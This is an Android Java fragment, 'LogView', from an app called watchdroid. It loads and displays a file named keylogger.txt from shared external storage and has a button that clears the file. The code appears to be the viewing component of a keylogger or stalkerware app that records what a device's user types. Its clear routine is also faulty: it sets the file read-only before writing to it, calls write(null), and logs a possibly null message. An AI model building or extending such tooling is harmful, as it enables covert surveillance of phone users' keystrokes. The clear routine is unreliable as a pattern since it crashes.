package com.watchdroid;

import android.content.Context;
import android.os.Bundle;
import android.support.design.widget.FloatingActionButton;
import android.support.v4.app.Fragment;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;

public class LogView extends Fragment {

    private String FILENAME;
    File dir,file,outfile;
    StringBuilder text;
    String line;
    TextView log;
    Context mContext;

    private Boolean isFabOpen = false;
    private FloatingActionButton plus,clear;
    private Animation fab_open,fab_close,rotate_forward,rotate_backward;

    public LogView() {
        // Required empty public constructor
    }

    public static LogView newInstance() {
        return new LogView();
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View v = inflater.inflate(R.layout.log_view, container, false);

        try {
            FILENAME = "keylogger.txt";
            dir = new File("/sdcard/Android/data/arx_era");
            file = new File(dir, FILENAME);
            text = new StringBuilder();
            BufferedReader br = new BufferedReader(new FileReader(file));
            while ((line = br.readLine()) != null) {
                //line = line.replace("[Back]","");
                text.append(line);
                text.append('\n');
            }
            br.close();
        } catch (IOException e) {
            text.append("File not found");
        }

        log = (TextView) v.findViewById(R.id.log);
        log.setMovementMethod(new ScrollingMovementMethod());
        log.setText(text);
        log.setGravity(Gravity.NO_GRAVITY);

        plus = (FloatingActionButton) v.findViewById(R.id.plus);
        clear = (FloatingActionButton) v.findViewById(R.id.clear);
        fab_open = AnimationUtils.loadAnimation(getActivity().getApplicationContext(), R.anim.fab_open);
        fab_close = AnimationUtils.loadAnimation(getActivity().getApplicationContext(),R.anim.fab_close);
        rotate_forward = AnimationUtils.loadAnimation(getActivity().getApplicationContext(),R.anim.rotate_forward);
        rotate_backward = AnimationUtils.loadAnimation(getActivity().getApplicationContext(),R.anim.rotate_backward);
        plus.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                animateFAB();
            }
        });
        clear.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                file.delete();
                outfile = new File(dir, FILENAME);
                try {
                    outfile.setReadOnly();
                    FileOutputStream fos = new FileOutputStream(outfile, true);
                    fos.write(null);
                    fos.close();
                    log.setText("Log cleared");
                    Toast.makeText(getActivity(), "Restart app", Toast.LENGTH_SHORT).show();
                } catch (Exception e) {
                    Log.d("EXCEPTION", e.getMessage());
                }
            }
        });

        return v;
    }

    public void animateFAB(){
        if(isFabOpen){
            plus.startAnimation(rotate_backward);
            clear.startAnimation(fab_close);
            clear.setClickable(false);
            isFabOpen = false;
        } else {
            plus.startAnimation(rotate_forward);
            clear.startAnimation(fab_open);
            clear.setClickable(true);
            isFabOpen = true;
        }
    }

    @Override
    public void onResume() {
        super.onResume();
    }

    @Override
    public void onAttach(Context context) {
        super.onAttach(context);
        mContext = context;
    }

}
